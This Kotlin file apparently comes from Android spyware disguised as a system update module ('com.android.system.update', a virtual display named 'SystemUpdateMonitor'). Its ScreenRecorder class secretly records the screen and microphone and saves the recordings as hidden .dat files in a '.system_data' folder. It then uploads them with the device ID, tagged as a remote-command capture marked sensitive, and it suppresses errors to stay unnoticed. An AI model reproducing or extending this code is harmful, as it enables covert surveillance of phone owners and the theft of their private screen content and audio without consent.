package com.android.system.update.modules.media

import android.content.Context
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.WindowManager
import com.android.system.update.core.NetworkConnectionManager
import org.json.JSONObject
import java.io.File

class ScreenRecorder(private val context: Context) {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private val handler = Handler(Looper.getMainLooper())
    private val networkManager = NetworkConnectionManager(context)

    private val hiddenDir: File by lazy {
        File(context.filesDir, ".system_data").apply { if (!exists()) mkdirs() }
    }

    fun setProjection(projection: MediaProjection) {
        this.mediaProjection = projection
    }

    fun startRecording(durationSeconds: Int = 10) {
        if (isRecording || mediaProjection == null) return

        try {
            val metrics = DisplayMetrics()
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            windowManager.defaultDisplay.getRealMetrics(metrics)

            val videoFile = File(hiddenDir, ".scr_${System.currentTimeMillis()}.dat")

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoSize(metrics.widthPixels, metrics.heightPixels)
                setVideoFrameRate(24)
                setVideoEncodingBitRate(2 * 1024 * 1024)
                setOutputFile(videoFile.absolutePath)
                prepare()
            }

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "SystemUpdateMonitor",
                metrics.widthPixels, metrics.heightPixels, metrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder?.surface, null, null
            )

            mediaRecorder?.start()
            isRecording = true

            handler.postDelayed({
                stopAndUpload(videoFile)
            }, durationSeconds * 1000L)

        } catch (e: Exception) {
            cleanup()
        }
    }

    private fun stopAndUpload(file: File) {
        if (!isRecording) return
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            virtualDisplay?.release()
        } catch (e: Exception) {
        } finally {
            isRecording = false
            mediaRecorder = null
            virtualDisplay = null
        }

        if (file.exists() && file.length() > 0) {
            val payload = JSONObject().apply {
                put("device_id", getDeviceId())
                put("source_type", "screen_record")
                put("capture_mode", "remote_cmd")
                put("file_path", file.absolutePath)
                put("is_sensitive", true)
            }
            Thread { networkManager.sync(payload.toString(), "media_captures") }.start()
        }
    }

    private fun getDeviceId(): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    private fun cleanup() {
        isRecording = false
        mediaRecorder?.release()
        virtualDisplay?.release()
        mediaProjection?.stop()
    }
}